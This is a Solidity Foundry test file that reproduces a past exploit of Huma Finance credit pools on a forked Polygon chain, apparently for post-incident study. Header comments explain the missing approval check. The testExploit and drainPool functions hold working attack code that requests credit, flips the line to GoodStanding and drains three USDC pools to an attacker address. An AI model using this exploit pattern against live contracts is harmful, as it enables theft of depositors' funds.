// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~101390 USDC
// Attacker : 0x13B44e416e0f66359502E843AF2e1191f1260DaF
// Attack Contract : 0x44d4a434ae1529106e4b801315e22721978022a3
// Vulnerable Contract : 0x57107d02c2b70e09ad77240dbde7ad77fe91ea1c (Huma BaseCreditPool impl)
// Attack Tx : https://polygonscan.com/tx/0x7b8d641d76affcc029fd0e0f06ab81ad675b1da21ef79b82e1343016040ba359

// @Info
// Vulnerable Contract Code : https://polygonscan.com/address/0x57107d02c2b70e09ad77240dbde7ad77fe91ea1c#code

// @Analysis
// Twitter Guy :
//
// Huma Finance credit pools gate large credit lines behind the Evaluation Agent's
// approveCredit(). However both requestCredit() and refreshAccount() are open to anyone,
// and BaseCreditPool._updateDueInfo() unconditionally sets a credit line to GoodStanding
// when a billing period has passed and no payment is missed, without checking that the line
// was ever EA-approved. So an attacker can: (1) requestCredit() with creditLimit up to the
// pool's maxCreditLine (state = Requested), (2) refreshAccount() to flip the un-approved
// line straight to GoodStanding, then (3) drawdown() the pool's entire liquidity. The PoC
// drains three Polygon pools (one native-USDC, two USDC.e) for the test contract and
// forwards the proceeds to the attacker EOA.

interface IHumaCreditPool {
    function requestCredit(uint256 creditLimit, uint256 intervalInDays, uint256 numOfPayments) external;
    function refreshAccount(address borrower) external;
    function drawdown(uint256 borrowAmount) external;
    function poolConfig() external view returns (address);
}

interface IHumaPoolConfig {
    function maxCreditLine() external view returns (uint256);
}

address constant ATTACKER = 0x13B44e416e0f66359502E843AF2e1191f1260DaF;

IHumaCreditPool constant POOL_USDC = IHumaCreditPool(0x3EBc1f0644A69c565957EF7cEb5AEafE94Eb6FcE);
IHumaCreditPool constant POOL_USDCE_A = IHumaCreditPool(0x95533e56f397152B0013A39586bC97309e9A00a7);
IHumaCreditPool constant POOL_USDCE_B = IHumaCreditPool(0xe8926aDbFADb5DA91CD56A7d5aCC31AA3FDF47E5);

IERC20 constant USDC_NATIVE = IERC20(0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359);
IERC20 constant USDC_BRIDGED = IERC20(0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174);

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 86_725_403;
        vm.createSelectFork("polygon", forkBlock);
        vm.label(address(POOL_USDC), "Huma USDC Pool");
        vm.label(address(POOL_USDCE_A), "Huma USDC.e Pool A");
        vm.label(address(POOL_USDCE_B), "Huma USDC.e Pool B");
        vm.label(address(USDC_NATIVE), "USDC");
        vm.label(address(USDC_BRIDGED), "USDC.e");
        vm.label(ATTACKER, "Attacker");
    }

    function testExploit() public {
        // step 0: snapshot attacker EOA balances of both stolen assets
        uint256 usdcBefore = USDC_NATIVE.balanceOf(ATTACKER);
        uint256 usdceBefore = USDC_BRIDGED.balanceOf(ATTACKER);

        // step 1: drain each pool from a fresh, unprivileged borrower (this contract)
        uint256 usdcDrained = drainPool(POOL_USDC, USDC_NATIVE);
        uint256 usdceDrained = drainPool(POOL_USDCE_A, USDC_BRIDGED) + drainPool(POOL_USDCE_B, USDC_BRIDGED);

        // step 2: forward proceeds to the attacker EOA, mirroring sweepToken in the real tx
        USDC_NATIVE.transfer(ATTACKER, USDC_NATIVE.balanceOf(address(this)));
        USDC_BRIDGED.transfer(ATTACKER, USDC_BRIDGED.balanceOf(address(this)));

        uint256 usdcProfit = USDC_NATIVE.balanceOf(ATTACKER) - usdcBefore;
        uint256 usdceProfit = USDC_BRIDGED.balanceOf(ATTACKER) - usdceBefore;
        emit log_named_decimal_uint("Attacker USDC profit", usdcProfit, 6);
        emit log_named_decimal_uint("Attacker USDC.e profit", usdceProfit, 6);

        assertEq(usdcProfit, usdcDrained, "USDC profit forwarded");
        assertEq(usdceProfit, usdceDrained, "USDC.e profit forwarded");
        assertGt(usdcProfit, 80_000e6, "drained native USDC pool");
        assertGt(usdceProfit, 18_000e6, "drained USDC.e pools");
    }

    // Self-grant a GoodStanding line, then borrow the pool's full liquidity.
    function drainPool(IHumaCreditPool pool, IERC20 token) internal returns (uint256 drained) {
        IHumaPoolConfig config = IHumaPoolConfig(pool.poolConfig());

        // step 1a: open a credit line at the pool's max limit (state = Requested)
        pool.requestCredit(config.maxCreditLine(), 1, 10);
        // step 1b: refreshAccount flips the un-approved line to GoodStanding (no EA approval)
        pool.refreshAccount(address(this));

        // step 1c: borrow the entire balance the pool currently holds
        uint256 available = token.balanceOf(address(pool));
        uint256 balBefore = token.balanceOf(address(this));
        pool.drawdown(available);
        drained = token.balanceOf(address(this)) - balBefore;
    }
}
